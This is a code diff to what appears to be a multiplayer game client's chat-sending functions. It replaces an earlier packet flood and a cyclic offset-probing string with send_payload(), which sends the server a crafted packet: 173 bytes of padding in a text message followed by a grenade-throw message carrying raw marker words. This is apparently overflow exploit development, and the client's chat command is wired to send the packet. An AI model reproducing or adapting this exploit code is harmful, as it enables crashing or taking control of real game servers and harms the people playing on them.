@@ -267,33 +267,35 @@ void _toserver(char *text, int msg, int msgt)
     }
 }
 
-void senddata()
+void egk_putint(packetbuf &p, int val)
 {
+    p.put(val);
+    p.put(val >> 8);
+    p.put(val >> 16);
+    p.put(val >> 24);
+}
+
+void send_payload()
+{
+    std::string padding(173, 'G');
     packetbuf p(MAXTRANS, ENET_PACKET_FLAG_RELIABLE);
-    loopi(1337)
-    {
-        putint(p, SV_SOUND);
-        putint(p, 0x123456);
-    }
+    putint(p, SV_TEXTME);
+    sendstring(padding.c_str(), p);
+    putint(p, SV_THROWNADE);
+    egk_putint(p, 0x45464748);
+    egk_putint(p, 0x41424344);
     sendpackettoserv(1, p.finalize());
 }
 
 void toserver(char *text)
 {
-    senddata();
+    send_payload();
     // _toserver(text, SV_TEXT, SV_TEAMTEXT);
 }
 
 void toserverme(char *text)
 {
-    // flood
-    // char dbgtext[] = "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ";
-
-    // func call
-    char dbgtext[] = "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"
-                     "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRR"
-                     "dGI";
-    _toserver(dbgtext, SV_TEXTME, SV_TEAMTEXTME);
+    _toserver(text, SV_TEXTME, SV_TEAMTEXTME);
 }
 
 void echo(char *text)
